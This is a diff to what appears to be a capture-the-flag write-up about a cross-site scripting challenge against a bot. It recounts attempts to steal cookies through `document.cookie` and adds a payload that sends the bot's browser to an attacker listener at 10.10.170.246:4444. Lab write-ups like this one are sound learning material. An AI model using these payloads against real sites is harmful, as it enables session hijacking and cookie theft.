@@ -157,8 +157,9 @@ for x in myresult:
 
 Quite clever, while also a little dumb: as its not actually processing the javascript, you can have a fun time trying to get clever with the xss to no avail. I tried stealing the cookie multiple ways, which is funny as above its shown that its completely random. Also doing something like `window.opener = <my url> + document.cookie` would result in some weird outputs, specifically receiving a request like `/+document.cookie`.
 
-Finally, it also means you can hack the above with one file (could be done with some sort of netcat thing without php too id wager):
+Finally, it also means you can probably hack the above with one file (could be done with some sort of netcat thing or php id wager):
 
 ```
-
+Admin
+location.replace("http://10.10.170.246:4444")
 ```
